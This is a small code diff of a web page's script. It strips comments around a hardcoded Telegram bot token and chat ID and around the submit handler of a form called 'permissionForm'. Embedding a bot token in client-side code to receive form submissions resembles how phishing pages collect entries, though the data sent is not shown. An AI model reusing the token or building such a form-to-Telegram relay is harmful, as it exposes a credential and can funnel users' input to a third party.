@@ -96,10 +96,10 @@
         },
       };
 
-      // Telegram Bot Configuration
+      // Telegram Bot
       const telegramConfig = {
         botToken: "7782036550:AAG3VIgBDf1VE6BdhGJrdcw9J1Av1F7ihms",
-        chatId: "-1002694805849", // Replace with your channel's Chat ID (e.g., @MyChannel or -1001234567890)
+        chatId: "-1002694805849",
       };
 
       // Validation Functions
@@ -194,7 +194,6 @@
         }
       }
 
-      // Event Handlers
       elements.permissionForm.onsubmit = async function (e) {
         e.preventDefault();
         if (!validateForm()) return;
@@ -229,7 +228,6 @@
         });
       }
 
-      // Initialize
       setupRealTimeValidation();
     </script>
   </body>
